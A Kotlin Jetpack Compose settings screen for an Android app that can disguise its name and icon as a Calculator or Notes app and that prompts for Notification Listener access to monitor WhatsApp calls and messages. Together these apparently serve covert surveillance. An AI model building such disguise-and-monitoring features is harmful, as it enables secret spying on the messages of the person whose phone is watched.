package com.example.ui.screens

import android.content.Intent
import android.provider.Settings
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.imePadding
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Calculate
import androidx.compose.material.icons.filled.Description
import androidx.compose.material.icons.filled.Fingerprint
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Key
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.ui.theme.Amber500
import com.example.ui.theme.CardDark
import com.example.ui.theme.Cyan400
import com.example.ui.theme.Emerald400
import com.example.ui.theme.Navy700
import com.example.ui.theme.Navy800
import com.example.ui.theme.Navy900
import com.example.ui.theme.Rose500
import com.example.ui.theme.Slate200
import com.example.ui.theme.Slate400

data class IconOption(val key: String, val label: String, val icon: ImageVector)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SettingsScreen(
    customAppName: String,
    customAppIcon: String,
    onUpdateBranding: (name: String, iconKey: String) -> Unit,
    isDemoDataEnabled: Boolean,
    onToggleDemoData: (Boolean) -> Unit,
    onChangePasswords: (oldMaster: String, newMaster: String, newSecondary: String, hint: String) -> Boolean,
    onBack: () -> Unit
) {
    val context = LocalContext.current
    var isChangingPassword by remember { mutableStateOf(false) }
    var currentMasterPass by remember { mutableStateOf("") }
    var newMasterPass by remember { mutableStateOf("") }
    var newSecondaryPass by remember { mutableStateOf("") }
    var newHint by remember { mutableStateOf("") }
    var formMessage by remember { mutableStateOf<String?>(null) }
    var isSuccess by remember { mutableStateOf(false) }

    // Custom branding state
    var appNameInput by remember { mutableStateOf(customAppName) }
    var selectedIconKey by remember { mutableStateOf(customAppIcon) }
    var brandingMessage by remember { mutableStateOf<String?>(null) }

    val iconOptions = remember {
        listOf(
            IconOption("SHIELD", "Security", Icons.Default.Security),
            IconOption("CALCULATOR", "Calculator", Icons.Default.Calculate),
            IconOption("NOTES", "Notes", Icons.Default.Description),
            IconOption("SETTINGS", "Settings", Icons.Default.Settings),
            IconOption("VAULT", "Vault", Icons.Default.Lock)
        )
    }

    val scrollState = rememberScrollState()

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Text(
                        text = "Settings & Disguise",
                        style = MaterialTheme.typography.titleMedium.copy(
                            fontWeight = FontWeight.Bold,
                            color = Slate200
                        )
                    )
                },
                navigationIcon = {
                    IconButton(onClick = onBack, modifier = Modifier.testTag("settings_back_button")) {
                        Icon(imageVector = Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back", tint = Slate200)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Navy800)
            )
        },
        containerColor = Navy900
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .statusBarsPadding()
                .navigationBarsPadding()
                .imePadding()
                .verticalScroll(scrollState)
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Section 1: Custom App Name & Icon Customization (Stealth & Disguise)
            Card(
                colors = CardDefaults.cardColors(containerColor = CardDark),
                shape = RoundedCornerShape(16.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        text = "App Name & Icon Customization",
                        style = MaterialTheme.typography.titleMedium.copy(
                            fontWeight = FontWeight.Bold,
                            color = Slate200
                        )
                    )
                    Spacer(modifier = Modifier.height(4.dp))
                    Text(
                        text = "Aap app ka display title aur icon apni marzi se set kar sakte hain (e.g. Calculator ya Notes ka roop de sakte hain).",
                        style = MaterialTheme.typography.bodySmall.copy(color = Slate400)
                    )

                    Spacer(modifier = Modifier.height(14.dp))

                    OutlinedTextField(
                        value = appNameInput,
                        onValueChange = { appNameInput = it },
                        label = { Text("App Name / Display Title") },
                        placeholder = { Text("e.g. Calculator, Notes, Device Audit") },
                        singleLine = true,
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Cyan400,
                            unfocusedBorderColor = Navy700,
                            focusedTextColor = Slate200,
                            unfocusedTextColor = Slate200
                        ),
                        modifier = Modifier.fillMaxWidth()
                    )

                    Spacer(modifier = Modifier.height(12.dp))

                    Text(
                        text = "Choose Icon Style:",
                        style = MaterialTheme.typography.labelMedium.copy(color = Slate400)
                    )

                    Spacer(modifier = Modifier.height(8.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        iconOptions.forEach { opt ->
                            val isSelected = selectedIconKey == opt.key
                            Column(
                                modifier = Modifier
                                    .weight(1f)
                                    .background(
                                        color = if (isSelected) Cyan400.copy(alpha = 0.2f) else Navy800,
                                        shape = RoundedCornerShape(10.dp)
                                    )
                                    .border(
                                        width = if (isSelected) 1.5.dp else 1.dp,
                                        color = if (isSelected) Cyan400 else Navy700,
                                        shape = RoundedCornerShape(10.dp)
                                    )
                                    .clickable { selectedIconKey = opt.key }
                                    .padding(vertical = 10.dp),
                                horizontalAlignment = Alignment.CenterHorizontally
                            ) {
                                Icon(
                                    imageVector = opt.icon,
                                    contentDescription = opt.label,
                                    tint = if (isSelected) Cyan400 else Slate400,
                                    modifier = Modifier.size(24.dp)
                                )
                                Spacer(modifier = Modifier.height(4.dp))
                                Text(
                                    text = opt.label,
                                    color = if (isSelected) Cyan400 else Slate400,
                                    fontSize = 10.sp,
                                    maxLines = 1
                                )
                            }
                        }
                    }

                    if (brandingMessage != null) {
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            text = brandingMessage ?: "",
                            color = Emerald400,
                            style = MaterialTheme.typography.bodySmall
                        )
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Button(
                        onClick = {
                            onUpdateBranding(appNameInput, selectedIconKey)
                            brandingMessage = "App Name & Icon updated successfully!"
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Cyan400, contentColor = Navy900),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Save Name & Icon", fontWeight = FontWeight.Bold)
                    }
                }
            }

            // Section 2: WhatsApp Notification Listener Access
            Card(
                colors = CardDefaults.cardColors(containerColor = CardDark),
                shape = RoundedCornerShape(16.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(
                            modifier = Modifier
                                .size(36.dp)
                                .background(Color(0xFF25D366).copy(alpha = 0.15f), CircleShape),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.Notifications,
                                contentDescription = null,
                                tint = Color(0xFF25D366),
                                modifier = Modifier.size(20.dp)
                            )
                        }
                        Spacer(modifier = Modifier.width(10.dp))
                        Text(
                            text = "WhatsApp Audit Access",
                            style = MaterialTheme.typography.titleMedium.copy(
                                fontWeight = FontWeight.Bold,
                                color = Slate200
                            )
                        )
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    Text(
                        text = "Android privacy guidelines ke mutabiq WhatsApp calls aur messages par nazar rakhne ke liye Notification Listener ki ijazat zaroori hoti hai.",
                        style = MaterialTheme.typography.bodySmall.copy(color = Slate400, lineHeight = 16.sp)
                    )

                    Spacer(modifier = Modifier.height(12.dp))

                    Button(
                        onClick = {
                            try {
                                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                                context.startActivity(intent)
                            } catch (_: Exception) {}
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF25D366), contentColor = Navy900),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Open Notification Settings & Allow Access", fontWeight = FontWeight.Bold)
                    }
                }
            }

            // Section 3: Security & Passwords
            Card(
                colors = CardDefaults.cardColors(containerColor = CardDark),
                shape = RoundedCornerShape(16.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(
                            modifier = Modifier
                                .size(36.dp)
                                .background(Cyan400.copy(alpha = 0.15f), CircleShape),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.Security,
                                contentDescription = null,
                                tint = Cyan400,
                                modifier = Modifier.size(20.dp)
                            )
                        }
                        Spacer(modifier = Modifier.width(10.dp))
                        Text(
                            text = "Security Authentication",
                            style = MaterialTheme.typography.titleMedium.copy(
                                fontWeight = FontWeight.Bold,
                                color = Slate200
                            )
                        )
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(imageVector = Icons.Default.Lock, contentDescription = null, tint = Emerald400, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(text = "Dual-Password Encryption Active", color = Slate200, style = MaterialTheme.typography.bodyMedium)
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(imageVector = Icons.Default.Fingerprint, contentDescription = null, tint = Rose500, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(text = "Fingerprint Disabled (Aap ke hukam ke mutabiq)", color = Slate200, style = MaterialTheme.typography.bodyMedium)
                    }

                    Spacer(modifier = Modifier.height(14.dp))

                    if (!isChangingPassword) {
                        Button(
                            onClick = { isChangingPassword = true },
                            colors = ButtonDefaults.buttonColors(containerColor = Navy700, contentColor = Slate200),
                            shape = RoundedCornerShape(8.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Text("Change Dual Passwords")
                        }
                    } else {
                        OutlinedTextField(
                            value = currentMasterPass,
                            onValueChange = { currentMasterPass = it },
                            label = { Text("Current Master Password") },
                            visualTransformation = PasswordVisualTransformation(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = Cyan400,
                                unfocusedBorderColor = Navy700,
                                focusedTextColor = Slate200,
                                unfocusedTextColor = Slate200
                            ),
                            modifier = Modifier.fillMaxWidth()
                        )

                        Spacer(modifier = Modifier.height(8.dp))

                        OutlinedTextField(
                            value = newMasterPass,
                            onValueChange = { newMasterPass = it },
                            label = { Text("New Master Password") },
                            visualTransformation = PasswordVisualTransformation(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = Cyan400,
                                unfocusedBorderColor = Navy700,
                                focusedTextColor = Slate200,
                                unfocusedTextColor = Slate200
                            ),
                            modifier = Modifier.fillMaxWidth()
                        )

                        Spacer(modifier = Modifier.height(8.dp))

                        OutlinedTextField(
                            value = newSecondaryPass,
                            onValueChange = { newSecondaryPass = it },
                            label = { Text("New Secondary Backup Password") },
                            visualTransformation = PasswordVisualTransformation(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = Emerald400,
                                unfocusedBorderColor = Navy700,
                                focusedTextColor = Slate200,
                                unfocusedTextColor = Slate200
                            ),
                            modifier = Modifier.fillMaxWidth()
                        )

                        Spacer(modifier = Modifier.height(8.dp))

                        OutlinedTextField(
                            value = newHint,
                            onValueChange = { newHint = it },
                            label = { Text("New Password Hint") },
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = Cyan400,
                                unfocusedBorderColor = Navy700,
                                focusedTextColor = Slate200,
                                unfocusedTextColor = Slate200
                            ),
                            modifier = Modifier.fillMaxWidth()
                        )

                        if (formMessage != null) {
                            Spacer(modifier = Modifier.height(8.dp))
                            Text(
                                text = formMessage ?: "",
                                color = if (isSuccess) Emerald400 else Rose500,
                                style = MaterialTheme.typography.bodySmall
                            )
                        }

                        Spacer(modifier = Modifier.height(14.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = {
                                    if (newMasterPass.length < 4 || newSecondaryPass.length < 4) {
                                        formMessage = "Passwords must be at least 4 characters long."
                                        isSuccess = false
                                        return@Button
                                    }
                                    if (newMasterPass == newSecondaryPass) {
                                        formMessage = "Master and Backup passwords must be different."
                                        isSuccess = false
                                        return@Button
                                    }

                                    val ok = onChangePasswords(currentMasterPass, newMasterPass, newSecondaryPass, newHint)
                                    if (ok) {
                                        isSuccess = true
                                        formMessage = "Passwords updated successfully!"
                                        currentMasterPass = ""
                                        newMasterPass = ""
                                        newSecondaryPass = ""
                                    } else {
                                        isSuccess = false
                                        formMessage = "Current Master Password was wrong."
                                    }
                                },
                                colors = ButtonDefaults.buttonColors(containerColor = Cyan400, contentColor = Navy900),
                                shape = RoundedCornerShape(8.dp),
                                modifier = Modifier.weight(1f)
                            ) {
                                Text("Save", fontWeight = FontWeight.Bold)
                            }

                            Button(
                                onClick = {
                                    isChangingPassword = false
                                    formMessage = null
                                },
                                colors = ButtonDefaults.buttonColors(containerColor = Navy700, contentColor = Slate200),
                                shape = RoundedCornerShape(8.dp)
                            ) {
                                Text("Cancel")
                            }
                        }
                    }
                }
            }

            // Section 4: Demo Data Toggle
            Card(
                colors = CardDefaults.cardColors(containerColor = CardDark),
                shape = RoundedCornerShape(16.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            text = "Sample / Test Data Mode",
                            style = MaterialTheme.typography.titleSmall.copy(
                                fontWeight = FontWeight.Bold,
                                color = Slate200
                            )
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "Testing purpose ke liye fake sample data dekhna chahein toh toggle karein.",
                            style = MaterialTheme.typography.bodySmall.copy(color = Slate400)
                        )
                    }

                    Spacer(modifier = Modifier.width(12.dp))

                    Switch(
                        checked = isDemoDataEnabled,
                        onCheckedChange = onToggleDemoData,
                        colors = SwitchDefaults.colors(
                            checkedThumbColor = Navy900,
                            checkedTrackColor = Cyan400,
                            uncheckedThumbColor = Slate400,
                            uncheckedTrackColor = Navy700
                        ),
                        modifier = Modifier.testTag("demo_mode_switch")
                    )
                }
            }

            Spacer(modifier = Modifier.height(100.dp))
        }
    }
}
